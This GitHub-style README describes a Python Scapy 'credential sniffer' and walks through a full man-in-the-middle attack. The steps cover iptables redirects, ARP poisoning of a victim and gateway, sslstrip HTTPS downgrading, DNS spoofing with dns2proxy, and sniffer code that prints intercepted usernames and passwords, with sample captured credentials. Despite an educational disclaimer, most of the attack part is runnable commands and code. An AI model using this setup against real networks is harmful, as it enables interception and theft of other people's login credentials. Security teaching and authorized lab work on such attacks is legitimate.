<!-- Banner -->
<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&height=200&color=0:CB2D3E,100:EF473A&section=header&text=Packet%20Listener%20Tool&fontSize=50&fontColor=ffffff&desc=Python%20Scapy%20HTTP%20Sniffer&descSize=22&descAlignY=65&descColor=ffffff" alt="header" />
</p>

<p align="center">
  <b>📡 Packet Listener & Credential Sniffer</b><br>
  <i>A Python-based packet sniffer built with Scapy for educational MITM demonstrations and HTTP credential capture testing.</i>
</p>

---

<h2>📌 Features</h2>

<ul>
  <li>Captures live network packets</li>
  <li>Detects HTTP requests using <code>scapy_http</code></li>
  <li>Extracts raw HTTP payload data</li>
  <li>Displays captured login credentials and POST data</li>
  <li>Works with ARP spoofing tools for MITM demonstrations</li>
  <li>Simple Python implementation using Scapy</li>
</ul>

---

<h2>⚙️ Requirements</h2>

<ul>
  <li>Python 3</li>
  <li>Linux-based OS</li>
  <li>Root/sudo privileges</li>
  <li>Scapy library</li>
  <li>scapy_http module</li>
  <li>sslstrip</li>
  <li>dns2proxy</li>
  <li>Devices connected to the same local network</li>
</ul>

---

<h2>📥 Installation</h2>

<p>Clone the required repositories:</p>

<pre>
git clone https://github.com/Pro-Mousa/MITM.git
git clone https://github.com/singe/dns2proxy
</pre>

<p>Navigate into the repositories:</p>

<pre>
cd MITM
cd dns2proxy
</pre>

<p>Install dependencies:</p>

<pre>
pip install scapy
pip install scapy_http
</pre>

---

<h2>⚙️ Configure IPTables</h2>

<p>Redirect HTTP and DNS traffic before running the tools:</p>

<pre>
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
</pre>

---

<h2>🚀 Running the MITM Setup</h2>

<h3>TERMINAL 1 — ARP Poisoning</h3>

<pre>
python3 arp_poison.py -t 10.0.2.15 -g 10.0.2.1
</pre>

<p>
This poisons the ARP tables of both the victim and gateway to place the attacker in the middle of the communication.
</p>

---

<h3>TERMINAL 2 — Packet Listener</h3>

<pre>
python3 packet_listener.py
</pre>

<p>
Starts the packet sniffer and captures HTTP requests from the network.
</p>

---

<h3>TERMINAL 3 — SSLStrip</h3>

<pre>
sslstrip
</pre>

<p>
Attempts to downgrade HTTPS traffic to HTTP for testing purposes.
</p>

---

<h3>TERMINAL 4 — DNS2Proxy</h3>

<pre>
python dns2proxy.py
</pre>

<p>
Handles DNS spoofing and traffic redirection.
</p>

---

<h2>🧪 Testing</h2>

<ul>
  <li>Connect the victim machine to the same local network</li>
  <li>Visit HTTP or HTTPS login pages</li>
  <li>Enter login credentials</li>
  <li>Ensure the requests are sent successfully</li>
  <li>Check <code>packet_listener.py</code> output for captured data</li>
</ul>

<p>Example captured output:</p>

<pre>
b'username=admin&password=123456'
</pre>

---

<h2>🧠 How It Works</h2>

<ul>
  <li>The script continuously listens for packets on a network interface</li>
  <li>It checks whether packets contain HTTP requests</li>
  <li>If raw payload data exists, it extracts and displays the contents</li>
  <li>Captured payloads may include usernames, passwords, cookies, or POST data</li>
  <li>The tool works alongside ARP spoofing to intercept victim traffic</li>
</ul>

---

<h2>📄 Code Overview</h2>

<ul>
  <li><code>packet_listener()</code> → Starts packet sniffing on a network interface</li>
  <li><code>packet_analyzer()</code> → Analyzes captured packets</li>
  <li><code>packet.haslayer(http.HTTPRequest)</code> → Detects HTTP requests</li>
  <li><code>packet[scapy.Raw].load</code> → Extracts raw packet payload data</li>
</ul>

---

<h2>🧩 Code Explanation</h2>

<h3>Importing Libraries</h3>

<pre>
import scapy.all as scapy
from scapy_http import http
</pre>

<ul>
  <li><code>scapy</code> is used for packet sniffing and packet analysis</li>
  <li><code>scapy_http</code> provides HTTP packet detection support</li>
</ul>

---

<h3>Packet Listener Function</h3>

<pre>
def packet_listener(interface):
    scapy.sniff(iface = interface,store = False,prn = packet_analyzer)
</pre>

<ul>
  <li><code>iface</code> specifies the network interface to listen on</li>
  <li><code>store=False</code> prevents packets from being stored in memory</li>
  <li><code>prn=packet_analyzer</code> calls the analyzer function whenever a packet is captured</li>
</ul>

---

<h3>Packet Analyzer Function</h3>

<pre>
def packet_analyzer(packet):
</pre>

<p>
This function analyzes each captured packet.
</p>

---

<h3>Detecting HTTP Requests</h3>

<pre>
if packet.haslayer(http.HTTPRequest):
</pre>

<p>
Checks whether the packet contains an HTTP request layer.
</p>

---

<h3>Extracting Raw Payload Data</h3>

<pre>
if packet.haslayer(scapy.Raw):
    print(packet[scapy.Raw].load)
</pre>

<ul>
  <li>Checks if the packet contains raw payload data</li>
  <li>Extracts and prints packet contents</li>
  <li>This may include login credentials or form submissions</li>
</ul>

---

<h3>Starting the Listener</h3>

<pre>
packet_listener("eth0")
</pre>

<p>
Starts packet sniffing on the <code>eth0</code> network interface.
</p>

<p>Check available interfaces using:</p>

<pre>
ifconfig
</pre>

or

<pre>
ip a
</pre>

---

<h2>📡 Example Output</h2>

<pre>
b'username=admin&password=123456'
b'email=test@gmail.com&password=qwerty'
</pre>

---

<h2>⚠️ Important Notes</h2>

<ul>
  <li>Works only on local networks</li>
  <li>Requires root/sudo privileges</li>
  <li>Modern HTTPS websites using HSTS may block SSL stripping</li>
  <li>Some websites encrypt login requests completely</li>
  <li>Use only in authorized labs or penetration testing environments</li>
</ul>

---

<h2>🛑 Disclaimer</h2>

<p>
This project is strictly for educational purposes, cybersecurity learning, and authorized penetration testing.<br>
Do not use this tool on networks or systems without explicit permission.
</p>

---

<h2>📬 Contributing</h2>

<p>
Feel free to fork this repository and submit pull requests to improve the project.
</p>

---

<h2>📜 License</h2>

<p>
This project is licensed under the MIT License.<br>
@Pro-Mousa<br>
© 2026
</p>

<!-- Footer -->
<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&height=100&color=0:CB2D3E,100:EF473A&section=footer" alt="footer" />
</p>
